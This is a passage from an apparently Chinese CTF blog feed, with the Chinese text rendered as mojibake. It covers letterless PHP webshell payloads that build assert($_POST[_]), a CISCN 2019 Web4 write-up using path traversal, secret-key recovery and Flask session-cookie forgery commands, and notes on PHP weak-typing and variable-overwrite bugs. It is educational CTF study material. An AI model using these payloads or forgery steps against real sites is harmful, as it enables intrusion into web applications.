class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ„é€ é€ƒé€¸</span><br><span class="line">åŒæ ·æ„é€ assert($_POST[_]);</span><br><span class="line">è¿‡ç¨‹å’Œä¸Šé¢çš„ç›¸ä¼¼å°±æ˜¯æ„é€ å­—ç¬¦çš„æ–¹æ³•å˜æˆäº†å–å</span><br><span class="line">$_=(~%9E%8C%8C%9A%8D%8B);#$_=assert;</span><br><span class="line">$__=(~%A0%AF%B0%AC%AB);#$__=_POST;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br><span class="line">-------------------------------------------------</span><br><span class="line">$_=(~%9E%8C%8C%9A%8D%8B);$__=(~%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);&amp;_=phpinfo()</span><br></pre></td></tr></table></figure></p><h2 id="è‡ªå¢ç»•è¿‡"><a href="#è‡ªå¢ç»•è¿‡" class="headerlink" title="è‡ªå¢ç»•è¿‡"></a>è‡ªå¢ç»•è¿‡</h2><p>è¿™é‡Œç›´æ¥ä¸Špç¥æ–‡ç« <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">æ— å­—æ¯æ•°å­—ç»•è¿‡</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œè¾“å‡ºå€¼ä¸ºBä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹å­—ç¬¦çš„è‡ªå¢æ¥è·å–å…¶ä»–å­—ç¬¦<br>å³æˆ‘ä»¬å¾—åˆ°Aå°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•å¾—åˆ°A-Zå’Œa-z.<br>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå¾—åˆ°Aå‘¢?<br>pç‰›æ–‡ç« æœ‰æŒ‡å‡ºå½“æˆ‘ä»¬å¼ºåˆ¶å°†å­—ç¬¦ä¸²å’Œæ•°ç»„æ‹¼æ¥åœ¨ä»¥å‰æ—¶æ•°ç»„ä¼šå˜æˆArray.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> [].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">---------------------------è¾“å‡º</span><br><span class="line">Array</span><br><span class="line">Array</span><br></pre></td></tr></table></figure><br>å‘ç°åªè¦æˆ‘ä»¬å°†ç©ºå­—ç¬¦å’Œæ•°ç»„æ‹¼æ¥å°±èƒ½å¾—åˆ°Array,å³ä½¿åªæœ‰[]å’Œâ€™â€™ä¹Ÿå¯ä»¥<br>åœ¨å¼ºåˆ¶å°†æ•°ç»„è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ä¹Ÿä¼šå˜æˆArray.å³<code>$_=[];$_=&quot;$_&quot;``$_===Array</code>.<br>åœ¨ç»è¿‡ç²¾ç»†çš„æ„é€ å°±ä¼šå˜æˆå¦‚ä¸‹payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><br>è¿™å°±èƒ½æ„é€ å‡º<code>ASSERT($_POST[_]);</code></p><h1 id="CISCN-2019åä¸œå—-Web4"><a href="#CISCN-2019åä¸œå—-Web4" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h1><p>è¿™é¢˜æˆ‘ä»¬æ‰“å¼€ï¼Œä»–ä¼šè®©æˆ‘ä»¬ç‚¹å‡»ä»€ä¹ˆã€‚å‘ç°æœ‰urlå‚æ•°ã€‚ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ssrfã€‚æ‰«äº†ä¸€ä¸‹ç›®å½•å‘ç°æ²¡æœ‰æ‰«åˆ°ä»€ä¹ˆã€‚åªæ‰«åˆ°consoleã€‚è¿™æ—¶å€™å°±åº”è¯¥æƒ³åˆ°ç›®å½•ç©¿è¶Šæ‰å¯¹çš„ã€‚ä½†æ˜¯æˆ‘æ²¡è¿›è¡Œå°è¯•ï¼Œå°±ç›´æ¥çœ‹æ¥wpï¼Œå‘ç°æ˜¯ç›®å½•ç©¿è¶Šã€‚äºæ˜¯å°±ç”¨<code>/proc/self/cmdline</code>æŸ¥çœ‹äº†ä¸€ä¸‹è¿›ç¨‹å…¶æºç ã€‚<br><code>/usr/local/bin/python/app/app.py</code>æˆ‘ä»¬æŸ¥çœ‹æºç <br> <br> <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å­˜åœ¨flag.txt.åªè¦æˆ‘ä»¬çš„sessionçš„usernameä¸ºfuckï¼Œå°±å¯ä»¥è¯»å–/flagã€‚è¿™é‡Œå°±å¯ä»¥è¿›è¡Œsessionä¼ªé€ äº†ã€‚æˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹key<br>ä¼šå‘ç°è¿™æ®µä»£ç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure><br>è¿™ä¹Ÿç®—æ–°çŸ¥è¯†äº†è®°ä¸‹æ¥ã€‚å…¶random.seedä¸ºè®¾ç½®éšæœºæ•°ç§å­ï¼Œä¼ªéšæœºè®¾ç½®äº†ç§å­æ¯ä¸ªç§å­ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒã€‚getnode()å‡½æ•°è·å¾—macç½‘å¡åœ°å€ã€‚å¾—åˆ°çš„æ˜¯16è¿›åˆ¶æ•°ç»„å³æ²¡æœ‰:ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨/sys/class/net/eth0/addressæ¥å¾—åˆ°macåœ°å€ã€‚<br>æ³¨æ„é¢˜ç›®çš„pythonç‰ˆæœ¬ä¸º2.7.16<br><br>æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨ç½‘ä¸Šçš„åœ¨çº¿ç¼–è¯‘å™¨æ¥ç¼–è¯‘è¿™ä¸ªä»£ç <br><img src="image-1.png" alt="alt text"><br>å¾—åˆ°keyä¸º60.455500014<br><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s &quot;60.455500014&quot; -c &quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zfw0fg.C03PLKYSlBxllEx1QOk4057mB4U&quot;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------</span><br><span class="line">python flask_session_cookie_manager3.py encode -s &quot;60.455500014&quot; -t &quot;&#123;&#x27;username&#x27;:b&#x27;fuck&#x27;&#125;&quot;</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Zfw2uA.DJbCXsbUay8NpJFBUkEbIBaQxSE</span><br></pre></td></tr></table></figure><br><br>å¾—åˆ°flagï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯è®¡ç®—PINæ¥è¿›è¡Œrceçš„ä½†æ˜¯è¿™ä¹ˆä¹Ÿç®—ä¸å‡ºæ¥ã€‚å¯ä»¥è¿™ä¸ªæ–¹æ³•å¯ä»¥ä½†æ˜¯æˆ‘æ‰¾ä¸åˆ°è„šæœ¬ï¼Œæ‚²</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> åˆ·é¢˜ </category>
          
          <category> NSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpç‰¹æ€§</title>
      <link href="/2024/03/15/php%E7%89%B9%E6%80%A7-1/"/>
      <url>/2024/03/15/php%E7%89%B9%E6%80%A7-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”±äºæœ¬äººå‘ç°æˆ‘å¯¹phpçš„ç‰¹æ€§åªæœ‰æµ…æ˜¾çš„è®¤çŸ¥ï¼Œå°¤å…¶æ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„è®¤çŸ¥ä¸å¤Ÿå……åˆ†æ‰€ä»¥å†™ä¸‹è¿™ç¯‡æ–‡ç« "><a href="#ç”±äºæœ¬äººå‘ç°æˆ‘å¯¹phpçš„ç‰¹æ€§åªæœ‰æµ…æ˜¾çš„è®¤çŸ¥ï¼Œå°¤å…¶æ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„è®¤çŸ¥ä¸å¤Ÿå……åˆ†æ‰€ä»¥å†™ä¸‹è¿™ç¯‡æ–‡ç« " class="headerlink" title="ç”±äºæœ¬äººå‘ç°æˆ‘å¯¹phpçš„ç‰¹æ€§åªæœ‰æµ…æ˜¾çš„è®¤çŸ¥ï¼Œå°¤å…¶æ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„è®¤çŸ¥ä¸å¤Ÿå……åˆ†æ‰€ä»¥å†™ä¸‹è¿™ç¯‡æ–‡ç« "></a>ç”±äºæœ¬äººå‘ç°æˆ‘å¯¹phpçš„ç‰¹æ€§åªæœ‰æµ…æ˜¾çš„è®¤çŸ¥ï¼Œå°¤å…¶æ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„è®¤çŸ¥ä¸å¤Ÿå……åˆ†æ‰€ä»¥å†™ä¸‹è¿™ç¯‡æ–‡ç« </h1><h1 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h1><p>é¦–å…ˆå°±æ˜¯è€ç”Ÿå¸¸è°ˆçš„å¼±æ¯”æ•™äº†ã€‚<br>ç”±äºå¯¹è¿™å—è¿˜æ˜¯è¾ƒä¸ºå±æ€§æ‰€ä»¥æˆ‘å°±è®°å½•ä¸€äº›å¼±ç±»å‹æ¯”è¾ƒçš„å‡½æ•°å°±å¥½<br>æ³¨æ„:ä¸€èˆ¬å¼±æ¯”è¾ƒåªæœ‰åœ¨ä¸åŒç±»å‹è¿›è¡Œæ¯”è¾ƒæ˜¯æ‰ä¼šå±•ç°å‡ºç‰¹æ€§ã€‚</p><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p>in_array()åœ¨æ•°ç»„ä¸­æŸ¥æ‰¾å­—ç¬¦ï¼Œæ‰¾åˆ°è¿”å›trueï¼Œæ²¡æ‰¾åˆ°è¿”å›false<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">in_array</span>(<span class="number">0</span>,<span class="variable">$array</span>);</span><br><span class="line">-------</span><br><span class="line"><span class="keyword">bool</span>(ture)</span><br></pre></td></tr></table></figure></p><h3 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h3><p>è¿™ä¸ªå‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç»™å®šçš„å€¼ï¼Œå¹¶è¿”å›é”®åï¼ˆå¦‚æœæ‰¾åˆ°çš„è¯ï¼‰ã€‚å®ƒæ˜¯éä¸¥æ ¼çš„ï¼Œæ„å‘³ç€åœ¨æ¯”è¾ƒæ—¶ä¸ä¼šæ£€æŸ¥æ•°æ®ç±»å‹ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1aaaa&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="number">1</span>, <span class="variable">$array</span>); <span class="comment">// è¿™é‡Œä¼šæ‰¾åˆ°ï¼Œå› ä¸º &#x27;1&#x27; ä¼šè¢«è½¬æ¢ä¸ºæ•´æ•° 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>; <span class="comment">// è¾“å‡º 1</span></span><br></pre></td></tr></table></figure></p><h3 id="array-keys"><a href="#array-keys" class="headerlink" title="array_keys()"></a>array_keys()</h3><p>å½“ä¸å¯é€‰çš„ search_value å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œarray_keys() å‡½æ•°ä¼šè¿”å›æ‰€æœ‰åŒ¹é…è¯¥å€¼çš„é”®åã€‚è¿™ä¹Ÿæ˜¯éä¸¥æ ¼çš„æ¯”è¾ƒã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;cherry&#x27;</span>);</span><br><span class="line"><span class="variable">$keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$array</span>, <span class="number">0</span>); <span class="comment">// æœç´¢å€¼ä¸º &#x27;banana&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$keys</span>); </span><br><span class="line"><span class="comment">/* è¾“å‡º </span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">[0] =&gt; a</span></span><br><span class="line"><span class="comment">[1] =&gt; b</span></span><br><span class="line"><span class="comment">[2] =&gt; c</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶è¿”å›äº†æ‰€æœ‰é”®è¿™æ˜¯å› ä¸ºå¼±ç±»å‹æ¯”è¾ƒå¯¼è‡´äº†å­—ç¬¦å’Œ0è¢«å½“æˆç›¸ç­‰çš„ã€‚</p><h1 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h1><p>ä¹Ÿæ˜¯è€ç”Ÿå¸¸è°ˆçš„phpæ¼æ´äº†ï¼Œä¸»è¦æˆå› æ˜¯<code>$$a=$$b</code>å‘ç”Ÿäº†è¿™æ ·çš„åŒé‡èµ‹å€¼ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=flag_in_here</span><br><span class="line"><span class="variable">$c</span>=hahahaha</span><br><span class="line"><span class="variable">$a</span>=flag</span><br><span class="line"><span class="variable">$b</span>=c</span><br><span class="line"><span class="variable">$$b</span>=<span class="variable">$$a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å¹¶ä¸ä¼šè¾“å‡ºhahahahaè€Œä¼šè¾“å‡º<code>$flag</code>çš„å€¼<br>è¿™å°±å› ä¸º<code>$b</code>æŒ‡å‘cè€Œ<code>$$b</code>å°±ä»£è¡¨äº†<code>$c``$$a</code>åŒç†ä»£è¡¨<code>$flag</code>è¿™å°±å¯¼è‡´äº†å˜é‡è¦†ç›–<br>æœ‰æ—¶å€™å˜é‡è¦†ç›–å’Œè¾“å‡ºä¼šå‡ºç°åœ¨å‡½æ•°é‡Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•å°†å˜é‡è¦†ç›–ä¸ºGLOBALSå…¨å±€å˜é‡,è¿™ä¸ªå˜é‡ä¿å­˜äº†è„šæœ¬æ‰€æœ‰çš„å˜é‡.</p><h1 id="æŸäº›å€¼å¾—å•é¢†å‡ºæ¥è®²çš„å‡½æ•°"><a href="#æŸäº›å€¼å¾—å•é¢†å‡ºæ¥è®²çš„å‡½æ•°" class="headerlink" title="æŸäº›å€¼å¾—å•é¢†å‡ºæ¥è®²çš„å‡½æ•°"></a>æŸäº›å€¼å¾—å•é¢†å‡ºæ¥è®²çš„å‡½æ•°</h1><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>intval()è¿™ä¸ªå‡½æ•°è¿˜æ˜¯æŒºæœ‰æ„æ€çš„æ‰€ä»¥æˆ‘å•é¢†å‡ºæ¥è®²ä¸€è®²<br>intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() 